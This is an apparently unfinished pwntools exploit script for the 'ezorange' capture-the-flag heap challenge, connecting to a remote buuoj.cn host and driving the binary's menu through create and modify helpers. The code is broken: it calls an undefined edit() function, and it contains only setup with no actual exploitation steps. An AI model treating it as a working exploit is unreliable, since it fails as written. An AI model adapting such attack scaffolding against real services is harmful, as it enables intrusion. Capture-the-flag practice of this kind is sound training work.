# -*- coding: utf-8 -*-
from pwn import *
elf_file = FILENAME = './ezorange'
elf = context.binary = ELF(elf_file)
context.log_level = 'debug' # output verbose log



HOST = 'node4.buuoj.cn'
POST = 28317
libc = ELF("./libc-2.23.so")
'''
HOST = 'localhost'
POST = 7777
libc = ELF("./libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386/data/lib64/libc.so.6")
'''
c = remote(HOST, POST)


def create(n1,n2):
  c.sendlineafter('> ','1')
  c.sendlineafter('Orange number: ',str(n1))
  c.sendlineafter('Size: ',str(n2))
  sleep(1)

def modify(n1,n2,n3):
  c.sendlineafter('> ','2')
  c.sendlineafter('Orange number: ',str(n1))
  c.sendlineafter('Cell index: ',str(n2))
  c.sendlineafter('New value: ',str(n3))
  sleep(1)


create(1,0)
create(0,0)

edit(0,24,)#0x21#33
#delete(1)

c.interactive()